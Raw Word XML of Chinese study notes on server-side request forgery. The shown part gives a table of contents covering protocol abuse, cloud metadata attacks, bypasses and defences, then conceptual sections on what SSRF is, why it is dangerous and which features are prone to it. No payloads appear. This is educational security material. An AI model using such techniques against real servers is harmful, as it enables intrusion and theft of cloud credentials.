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FF6CB" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>服务端请求伪造（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>SSRF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70BB9F03" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>学习笔记</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> . </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>从原理到实战</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68D02B0D" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>整理日期：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07</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>月</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>03</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>日</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15108065" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="002E49D8">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="351A6108" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>目</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50094E8A" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>一、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">SSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>概述</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1016EDC9" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>二、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">SSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>与</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> CSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>的区别</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AACEFD7" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>三、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">SSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>漏洞验证方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3779F14F" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">    3.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>判断是否</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>服务端发请求</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="5C2B343F" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">    3.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>内网探测测试</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="008038D8" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>四、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">SSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>协议利用详解</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="521175C8" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">4.1 file:// - </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>读取本地文件</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="02E06628" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t xml:space="preserve">    4.2 dict:// - </w:t>
      </w:r>
      <w:r>
        <w:t>服务探测</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75BBCC11" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t xml:space="preserve">    4.3 gopher:// - </w:t>
      </w:r>
      <w:r>
        <w:t>构造任意</w:t>
      </w:r>
      <w:r>
        <w:t>TCP</w:t>
      </w:r>
      <w:r>
        <w:t>包</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4090A994" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t xml:space="preserve">    4.4 </w:t>
      </w:r>
      <w:r>
        <w:t>其他协议</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08C677D9" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t>五、云服务</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Metadata </w:t>
      </w:r>
      <w:r>
        <w:t>攻击（最危险）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40F07495" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t>六、</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">SSRF </w:t>
      </w:r>
      <w:r>
        <w:t>纵深利用链</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63B54D2C" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>七、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">SSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>绕过技巧</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D5E710B" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>八、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">SSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>防御方案</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B238796" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>九、工具链与靶场</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D158877" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>十、常见问题解答</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E212A8D" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>十一、知识框架图</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="696A3D95" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="002E49D8">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2BC97F95" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="1"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>一、</w:t>
      </w:r>
      <w:r>
        <w:t>SSRF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>概述</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="6C3033AB" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.1 </w:t>
      </w:r>
      <w:r>
        <w:t>什么是</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> SSRF</w:t>
      </w:r>
      <w:r>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="103B1E56" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t xml:space="preserve">SSRF </w:t>
      </w:r>
      <w:r>
        <w:t>全称</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Server-Side Request Forgery</w:t>
      </w:r>
      <w:r>
        <w:t>（服务端请求伪造）。攻击者通过漏洞服务器，让服务器代替自己向内部或外部的目标发起请求。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47077C6B" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t>核心一句话：攻击者不能直接打目标，但可以让服务器替他去打</w:t>
      </w:r>
      <w:r>
        <w:t>——</w:t>
      </w:r>
      <w:r>
        <w:t>服务器在内网，就相当于攻击者打进了内网；服务器能访问云服务</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Metadata</w:t>
      </w:r>
      <w:r>
        <w:t>，就能拿到云凭据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="053CF109" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>简单</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>理解：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">A </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>让</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> B </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>帮忙访问</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>（服务器）是跳板，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>（攻击者）利用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> B </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>的权限去访问</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>（内网</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>本机</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>云服务）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DF7A9C9" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.2 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>为什么</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> SSRF </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>危害大</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71392A61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服务器通常在内网，可以访问外部无法直接访问的内部服务</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="391BCB71" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>服务器的权限通常比普通用户高（可能以</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> root/system </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>权限运行</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A587FCB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可以绕过防火墙</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>——</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>请求从服务器内部发出，防火墙视为内网流量</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="302B9578" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="a0"/>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>云环境</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>可以读取</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Metadata </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>接口，获取</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>云服务</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>凭据，直接控制云资源</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1311E6DA" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>可以结合</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Redis</w:t>
      </w:r>
      <w:r>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:t>MySQL</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>等内网服务实现</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> RCE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30D1ECE6" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.3 </w:t>
      </w:r>
      <w:r>
        <w:t>哪些功能容易产生</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>SSRF</w:t>
      </w:r>
      <w:r>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0079F3C6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图片</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>文件远程下载（用户输入</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>，服务器下载）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61899997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 xml:space="preserve">URL </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>预览</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>翻译服务（输入网址，服务器抓取并返回）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76D62B91" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>WebHook</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> / </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>回调地址（用户配置回调</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> URL</w:t>
      </w:r>
      <w:r>
        <w:t>）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11524CB2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 xml:space="preserve">API </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>代理</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>转发（服务器代理用户请求其他</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> API</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D54F540" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">XML </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>外部实体注入（</w:t>
      </w:r>
      <w:r>
        <w:t>XXE</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> + SSRF </w:t>
      </w:r>
      <w:r>
        <w:t>组合）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F514EA5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数据库连接</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>导入（从远程</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> URL </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>导入数据）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D430B33" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>二、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">SSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>与</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> CSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>的区别</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="201175A7" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">CSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> SSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>名字都有</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>请求伪造</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>，但本质完全不同。一个经典的对比：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49D8" w14:paraId="5815D382" w14:textId="77777777" w:rsidTr="002E4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DB3E24" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
            <w:proofErr w:type="spellStart"/>
            <w:r>
              <w:t>维度</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6DEBC6F0" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A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CSRF</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="093BD98E" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A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SSRF</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
